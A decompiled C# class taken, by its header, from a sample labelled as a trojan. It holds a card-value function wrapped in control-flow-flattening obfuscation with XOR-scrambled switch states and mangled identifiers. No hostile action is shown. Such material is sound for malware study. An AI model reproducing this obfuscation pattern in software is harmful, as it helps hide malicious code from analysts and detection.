// Decompiled with JetBrains decompiler
// Type: IMoni.UnknownWrap
// Assembly: DictionaryValueCollect, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 264A7E74-FCA9-4101-A215-90F8B6150D1A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan.MSIL.Crypt.hzzu-0a11971438302748e2f40e97f73af5e24c71212b30c9d6a5aff7ff102e662c94.exe

using EncoderFallb;
using ParseRec;
using VerificationExcept;

namespace IMoni
{
  internal class UnknownWrap : RealProxyFl
  {
    public RSASignaturePadd Suit { get; set; }

    public PrimaryInteropAssemblyAttrib Pip { get; set; }

    public bool Set { get; set; }

    public UnknownWrap()
    {
    }

    public UnknownWrap(RSASignaturePadd Suit, PrimaryInteropAssemblyAttrib Pip)
    {
      this.Suit = Suit;
      this.Pip = Pip;
      this.Set = true;
    }

    public int GetCardValue()
    {
label_1:
      int num1 = 1741891448;
      int cardValue;
      while (true)
      {
        uint num2;
        int num3;
        switch ((num2 = (uint) (num1 ^ 769689002)) % 13U)
        {
          case 0:
            goto label_1;
          case 1:
            if (this.Pip != PrimaryInteropAssemblyAttrib.Four)
            {
              num1 = (int) num2 * 1309863899 ^ -2062769397;
              continue;
            }
            num3 = 4;
            break;
          case 2:
            if (this.Pip != PrimaryInteropAssemblyAttrib.Three)
            {
              num1 = (int) num2 * 1378722855 ^ 306341117;
              continue;
            }
            num3 = 3;
            break;
          case 4:
            if (this.Pip == PrimaryInteropAssemblyAttrib.Nine)
            {
              num3 = 9;
              break;
            }
            num1 = (int) num2 * 540219555 ^ -1309074569;
            continue;
          case 5:
            if (this.Pip == PrimaryInteropAssemblyAttrib.Eight)
            {
              num3 = 8;
              break;
            }
            num1 = (int) num2 * -1842592092 ^ -1450351110;
            continue;
          case 6:
            num3 = 10;
            break;
          case 7:
            if (this.Pip != PrimaryInteropAssemblyAttrib.Two)
            {
              num1 = (int) num2 * 837070721 ^ -60871534;
              continue;
            }
            num3 = 2;
            break;
          case 8:
            num1 = (int) num2 * 751496054 ^ 367545024;
            continue;
          case 9:
            if (this.Pip == PrimaryInteropAssemblyAttrib.Seven)
            {
              num3 = 7;
              break;
            }
            num1 = (int) num2 * 1706007200 ^ 369603838;
            continue;
          case 10:
            if (this.Pip != PrimaryInteropAssemblyAttrib.Ace)
            {
              num1 = (int) num2 * 509123437 ^ 916921914;
              continue;
            }
            num3 = 1;
            break;
          case 11:
            if (this.Pip == PrimaryInteropAssemblyAttrib.Six)
            {
              num3 = 6;
              break;
            }
            num1 = (int) num2 * -926107116 ^ -1577834794;
            continue;
          case 12:
            if (this.Pip == PrimaryInteropAssemblyAttrib.Five)
            {
              num3 = 5;
              break;
            }
            num1 = (int) num2 * 1372344741 ^ -1460021673;
            continue;
          default:
            goto label_33;
        }
        cardValue = num3;
        num1 = 521225225;
      }
label_33:
      return cardValue;
    }
  }
}
